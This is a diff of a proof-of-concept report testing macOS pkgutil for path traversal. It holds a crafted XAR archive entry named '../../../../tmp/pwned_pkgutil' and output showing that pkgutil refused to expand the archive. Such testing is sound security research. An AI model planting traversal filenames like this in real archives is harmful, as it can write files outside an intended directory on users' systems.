@@ -1,17 +1,22 @@
-Report: OE1104428478322
-Date: Wed Oct 28 12:02:41 UTC 2026
+======================================
+  pkgutil Path Traversal PoC
+  Report: OE1104428478322
+======================================
 
---- System ---
+=== System ===
 ProductName:		macOS
 ProductVersion:		26.6.2
 BuildVersion:		25G83
 arm64
 
---- Tool ---
+=== pkgutil location ===
 /usr/sbin/pkgutil
-(no --version)
+/usr/sbin/pkgutil: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit executable x86_64] [arm64e:Mach-O 64-bit executable arm64e]
+/usr/sbin/pkgutil (for architecture x86_64):	Mach-O 64-bit executable x86_64
+/usr/sbin/pkgutil (for architecture arm64e):	Mach-O 64-bit executable arm64e
+(no --version flag)
 
---- poc.xar embedded filename ---
+=== poc.xar embedded filename ===
 === XAR TOC ===
 <?xml version="1.0" encoding="UTF-8"?>
 <xar>
@@ -35,6 +40,6 @@ arm64
   '../../../../tmp/pwned_pkgutil'
   ^^^ PATH TRAVERSAL SEQUENCE DETECTED
 
---- Vulnerability check ---
-RESULT: path not at expected location
-/tmp
+=== Running: pkgutil --expand poc.xar /tmp/safe_expand_dir ===
+Archive uses no hashing algorithm, aborting
+Could not open package for expansion: poc.xar
